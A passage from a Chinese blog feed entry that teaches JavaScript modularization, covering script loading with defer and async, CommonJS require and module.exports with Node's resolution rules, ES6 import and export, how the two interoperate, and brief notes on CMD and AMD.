class="code"><pre><span class="line">&lt;!-- 页面内嵌的脚本 --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot;&gt;</span><br><span class="line">  // module code</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 外部脚本 --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot; src=&quot;path/to/myModule.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>默认情况下，浏览器是同步加载 JavaScript 脚本，即渲染引擎遇到<code>&lt;script&gt;</code>标签就会停下来，等到执行完脚本，再继续向下渲染。如果是外部脚本，还必须加入脚本下载的时间。</p><p>如果脚本体积很大，下载和执行的时间就会很长，因此造成浏览器堵塞，用户会感觉到浏览器“卡死”了，没有任何响应。这显然是很不好的体验，所以浏览器允许脚本异步加载，下面就是两种异步加载的语法。</p><ul><li>defer是“渲染完再执行”</li><li>async是“下载完就执行”</li></ul><h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p><strong>Node.js是commonJS规范的主要实践者</strong>，它有四个重要的环境变量为模块化的实现提供支持：<strong>module</strong>、<strong>exports</strong>、<strong>require</strong>、<strong>global</strong>。实际使用时，用<strong>module.exports</strong>定义当前模块对外输出的接口（不推荐直接用<strong>exports</strong>），用<strong>require</strong>加载模块。</p><p>每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。</p><h3 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// example.js</span><br><span class="line">var x = 5;</span><br><span class="line">var addX = function (value) &#123;</span><br><span class="line">  return value + x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>上面代码中，变量x和函数addX，是当前文件example.js私有的，其他文件不可见。</strong></p><h3 id="global对象"><a href="#global对象" class="headerlink" title="global对象"></a>global对象</h3><p>如果想在多个文件分享变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.__ENV__ = dev;</span><br></pre></td></tr></table></figure><p>上面代码的<strong>ENV</strong>变量，可以被所有文件读取。当然，需要尽量避免定义全局属性</p><h3 id="导出模块"><a href="#导出模块" class="headerlink" title="导出模块"></a>导出模块</h3><p>CommonJS规范规定，每个模块内部，<strong>module</strong>变量代表当前模块。这个变量是一个对象，它的<strong>exports</strong>属性（即<strong>module.exports</strong>）是对外的接口。加载某个模块，其实是加载该模块的<strong>module.exports</strong>属性。</p><p>为了方便，Node为每个模块提供一个exports变量，指向module.exports。这等同在每个模块头部，有一行这样的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var exports = module.exports;</span><br></pre></td></tr></table></figure><p>在对外输出模块接口时，可以向<strong>exports</strong>对象添加方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exports.area = function (r) &#123;</span><br><span class="line">  return Math.PI * r * r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">exports.circumference = function (r) &#123;</span><br><span class="line">  return 2 * Math.PI * r;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意，不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exports = function(x) &#123;console.log(x)&#125;;</span><br></pre></td></tr></table></figure><p>这意味着，如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exports.hello = function() &#123;</span><br><span class="line">  return &apos;hello&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports = &apos;Hello world&apos;;</span><br></pre></td></tr></table></figure><p>下面代码中，hello函数是无法对外输出的，因为module.exports被重新赋值了</p><h3 id="引入模块"><a href="#引入模块" class="headerlink" title="引入模块"></a>引入模块</h3><p>Node使用CommonJS模块规范，内置的<strong>require</strong>命令用于加载模块文件。</p><p>require命令的基本功能是，<strong>读入并执行一个JavaScript文件</strong>，然后返回<strong>该模块的exports对象</strong>。如果没有发现指定模块，会报错。</p><blockquote><p>特性</p></blockquote><p>commonJS用同步的方式加载模块。在服务端，模块文件都存在本地磁盘，读取非常快，所以这样做不会有问题。但是在浏览器端，限于网络原因，更合理的方案是使用异步加载。</p><blockquote><p>导入模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// math.js</span><br><span class="line">var basicNum = 0;</span><br><span class="line">function add(a, b) &#123;</span><br><span class="line">  return a + b;</span><br><span class="line">&#125;</span><br><span class="line">module.exports = &#123; //在这里写上需要向外暴露的函数、变量</span><br><span class="line">  add: add,</span><br><span class="line">  basicNum: basicNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// index.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">//&#123;</span><br><span class="line">//    add: [Function],</span><br><span class="line">//    basicNum: 0</span><br><span class="line">//&#125;</span><br></pre></td></tr></table></figure><blockquote><p>加载规则</p></blockquote><ol><li><p>如果参数字符串以“/”开头，则表示加载的是一个位于绝对路径的模块文件。比如，require(‘/home/marco/foo.js’)将加载/home/marco/foo.js。</p></li><li><p>如果参数字符串以“./”开头，则表示加载的是一个位于相对路径（跟当前执行脚本的位置相比）的模块文件。比如，require(‘./circle’)将加载当前脚本同一目录的circle.js。</p></li><li><p>如果参数字符串不以“./“或”/“开头，而且是一个路径，比如require(‘example-module/path/to/file’)，则将先找到example-module的位置，然后再以它为参数，找到后续路径。</p></li><li><p>如果指定的模块文件没有发现，Node会尝试为文件名添加.js、.json、.node后，再去搜索。.js件会以文本格式的JavaScript脚本文件解析，.json文件会以JSON格式的文本文件解析，.node文件会以编译后的二进制文件解析。</p></li><li><p>如果想得到require命令加载的确切文件名，使用require.resolve()方法。</p></li><li><p>如果参数字符串不以“./“或”/“开头，则表示加载的是一个默认提供的核心模块（位于Node的系统安装目录中），或者一个位于各级node_modules目录的已安装模块（全局安装或局部安装）。</p></li></ol><p>举例来说，脚本/home/user/projects/foo.js执行了require(‘bar.js’)命令，Node会依次搜索以下文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/node/bar.js</span><br><span class="line">/home/user/projects/node_modules/bar.js</span><br><span class="line">/home/user/node_modules/bar.js</span><br><span class="line">/home/node_modules/bar.js</span><br><span class="line">/node_modules/bar.js</span><br></pre></td></tr></table></figure><blockquote><p>引入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 引用自定义的模块时，参数包含路径，可省略.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">math.add(2, 5);</span><br><span class="line"></span><br><span class="line">// 引用核心模块时，不需要带路径</span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">http.createService(...).listen(3000);</span><br></pre></td></tr></table></figure><blockquote><p>目录的加载规则</p></blockquote><p>在目录中放置一个package.json文件，并且将入口文件写入main字段。下面是一个例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// package.json</span><br><span class="line">&#123; &quot;name&quot; : &quot;some-library&quot;,</span><br><span class="line">  &quot;main&quot; : &quot;./lib/some-library.js&quot; &#125;</span><br></pre></td></tr></table></figure><h3 id="module对象"><a href="#module对象" class="headerlink" title="module对象"></a>module对象</h3><p>Node内部提供一个Module构建函数。所有模块都是Module的实例。</p><ul><li>module.id 模块的识别符，通常是带有绝对路径的模块文件名。</li><li>module.filename 模块的文件名，带有绝对路径。</li><li>module.loaded 返回一个布尔值，表示模块是否已经完成加载。</li><li>module.parent 返回一个对象，表示调用该模块的模块。</li><li>module.children 返回一个数组，表示该模块要用到的其他模块。</li><li>module.exports 表示模块对外输出的值。</li></ul><h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><p>模块功能主要由两个命令构成：<strong>export</strong>和<strong>import</strong>。<strong>export</strong>命令用于规定模块的对外接口，<strong>import</strong>命令用于输入其他模块提供的功能。</p><p>一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;module&quot;&gt;</span><br><span class="line">  import utils from &quot;./utils.js&quot;;</span><br><span class="line"></span><br><span class="line">  // other code</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h3><blockquote><p>它们有两个重大差异</p></blockquote><ul><li>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</li><li>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</li></ul><h4 id="ES6-模块加载-CommonJS-模块"><a href="#ES6-模块加载-CommonJS-模块" class="headerlink" title="ES6 模块加载 CommonJS 模块"></a>ES6 模块加载 CommonJS 模块</h4><p>CommonJS 模块的输出都定义在module.exports这个属性上面。Node 的import命令加载 CommonJS 模块，Node 会自动将module.exports属性，当作模块的默认输出，即等同于export default xxx。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// a.js</span><br><span class="line">module.exports = &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 等同于</span><br><span class="line">export default &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一共有三种写法，可以拿到 CommonJS 模块的module.exports。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 写法一</span><br><span class="line">import baz from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// 写法二</span><br><span class="line">import &#123;default as baz&#125; from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// 写法三</span><br><span class="line">import * as baz from &apos;./a&apos;;</span><br></pre></td></tr></table></figure><h4 id="CommonJS-模块加载-ES6-模块"><a href="#CommonJS-模块加载-ES6-模块" class="headerlink" title="CommonJS 模块加载 ES6 模块"></a>CommonJS 模块加载 ES6 模块</h4><p>CommonJS 模块加载 ES6 模块，不能使用require命令，而要使用import()函数。ES6 模块的所有输出接口，会成为输入对象的属性。</p><h3 id="导出模块-1"><a href="#导出模块-1" class="headerlink" title="导出模块"></a>导出模块</h3><h4 id="导出方式"><a href="#导出方式" class="headerlink" title="导出方式"></a>导出方式</h4><p>1、多次使用export</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">export var firstName = &apos;Michael&apos;;</span><br><span class="line">export var lastName = &apos;Jackson&apos;;</span><br><span class="line">export var year = 1958;</span><br></pre></td></tr></table></figure><p>export命令对外部输出了三个变量。</p><p>2、导出对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">var firstName = &apos;Michael&apos;;</span><br><span class="line">var lastName = &apos;Jackson&apos;;</span><br><span class="line">var year = 1958;</span><br><span class="line"></span><br><span class="line">export &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure><p>3、直接导出单个变量、函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function multiply(x, y) &#123;</span><br><span class="line">  return x * y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>4、导出默认模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 正确</span><br><span class="line">export var a = 1;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">var a = 1;</span><br><span class="line">export default a;</span><br><span class="line"></span><br><span class="line">// 错误</span><br><span class="line">export default var a = 1;</span><br></pre></td></tr></table></figure><h4 id="导出注意点"><a href="#导出注意点" class="headerlink" title="导出注意点"></a>导出注意点</h4><p><strong>export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。</strong>(简而言之导出的必须是对象的key)</p><blockquote><p>必须建议意义对应关系</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export var year = 1958;</span><br><span class="line">//==</span><br><span class="line">export &#123;</span><br><span class="line">    year</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 报错</span><br><span class="line">export 1;</span><br><span class="line">// 报错</span><br><span class="line">var m = 1;</span><br><span class="line">export m;</span><br></pre></td></tr></table></figure><blockquote><p>上面两种写法都会报错，因为没有提供对外的接口。正确写法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 写法一</span><br><span class="line">export var m = 1;</span><br><span class="line"></span><br><span class="line">// 写法二</span><br><span class="line">var m = 1;</span><br><span class="line">export &#123;m&#125;;</span><br><span class="line"></span><br><span class="line">// 写法三</span><br><span class="line">var n = 1;</span><br><span class="line">export &#123;n as m&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>同样的，function和class的输出，也必须遵守这样的写法。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 报错</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export f;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">export function f() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export &#123;f&#125;;</span><br></pre></td></tr></table></figure><p><strong>另外，export语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。</strong></p><h4 id="模块别名"><a href="#模块别名" class="headerlink" title="模块别名"></a>模块别名</h4><p>浏览器加载 <strong>ES6</strong> 模块，也使用<strong><code>&lt;script&gt;</code></strong>标签，但是要加入<strong>type=”module”</strong>属性</p><p>浏览器对于带有<strong>type=”module”</strong>的<strong><code>&lt;script&gt;</code></strong>，等同于打开了<strong><code>&lt;script&gt;</code>标签的defer</strong>属性。</p><blockquote><p>ES6 模块也允许内嵌在网页中</p></blockquote><ul><li>代码是在模块作用域之中运行，而不是在全局作用域运行。模块内部的顶层变量，外部不可见。</li><li>模块脚本自动采用严格模式，不管有没有声明use strict。</li><li>模块之中，可以使用import命令加载其他模块（.js后缀不可省略，需要提供绝对 URL 或相对 URL），也可以使用export命令输出对外接口。</li><li>模块之中，顶层的this关键字返回undefined，而不是指向window。也就是说，在模块顶层使用this关键字，是无意义的。</li><li>同一个模块如果加载多次，将只执行一次。</li></ul><blockquote><p>示例模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import utils from &apos;https://example.com/js/utils.js&apos;;</span><br><span class="line"></span><br><span class="line">const x = 1;</span><br><span class="line"></span><br><span class="line">console.log(x === window.x); //false</span><br><span class="line">console.log(this === undefined); // true</span><br></pre></td></tr></table></figure><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>使用export命令定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// main.js</span><br><span class="line">import &#123;firstName, lastName, year&#125; from &apos;./profile.js&apos;;</span><br><span class="line"></span><br><span class="line">function setName(element) &#123;</span><br><span class="line">  element.textContent = firstName + &apos; &apos; + lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，import命令具有提升效果，会提升到整个模块的头部，首先执行。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class="line"></span><br><span class="line">// ===&gt;</span><br><span class="line"></span><br><span class="line">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><blockquote><p>导入默认模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// export-default.js</span><br><span class="line">export default function () &#123;</span><br><span class="line">  console.log(&apos;foo&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// import-default.js</span><br><span class="line">import customName from &apos;./export-default&apos;;</span><br><span class="line">customName(); // &apos;foo&apos;</span><br></pre></td></tr></table></figure><h4 id="导入别名设置"><a href="#导入别名设置" class="headerlink" title="导入别名设置"></a>导入别名设置</h4><p>将surname是lastName的别名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; lastName as surname &#125; from &apos;./profile.js&apos;;</span><br></pre></td></tr></table></figure><p>将多个方法融合成一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// circle.js</span><br><span class="line"></span><br><span class="line">export function area(radius) &#123;</span><br><span class="line">  return Math.PI * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function circumference(radius) &#123;</span><br><span class="line">  return 2 * Math.PI * radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import * as circle from &apos;./circle&apos;;</span><br><span class="line"></span><br><span class="line">console.log(&apos;圆面积：&apos; + circle.area(4));</span><br><span class="line">console.log(&apos;圆周长：&apos; + circle.circumference(14));</span><br></pre></td></tr></table></figure><h4 id="按需加载"><a href="#按需加载" class="headerlink" title="按需加载"></a>按需加载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import(&apos;./utils.js&apos;)</span><br><span class="line">.then(Util =&gt; &#123;</span><br><span class="line">    console.log(Util);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>CMD(common module definition), 是sea.js在推广过程中对模块定义的规范化产出，主要用于浏览器端。推崇依赖就近、延迟执行。它的核心思想是：每个文件都是一个模块，在模块中定义的变量、函数、类都是私有的，对外不可见。有一个全局性方法require()，用于加载模块</p><p>AMD规范（Asynchronous Module Definition）：是 RequireJS 在推广过程中对模块定义的规范化产出，也是主要用于浏览器端。其特点是：依赖前置，需要在定义时就写好需要的依赖，提前执行依赖，应用有require.js</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://javascript.ruanyifeng.com/nodejs/module.html#toc0" target="_blank" rel="noopener">CommonJS规范</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在学习新一个东西前，最好的办法是了解它能给我们带来什么好处我们为什么学习它，从而激发学习兴趣，哈哈哈~又扯了一堆，下面进入我们前端模块化探索之旅吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;模块化的历史&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在正式进入模块化学习前我们来了解一下前端模块化的前生今世。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
</feed>
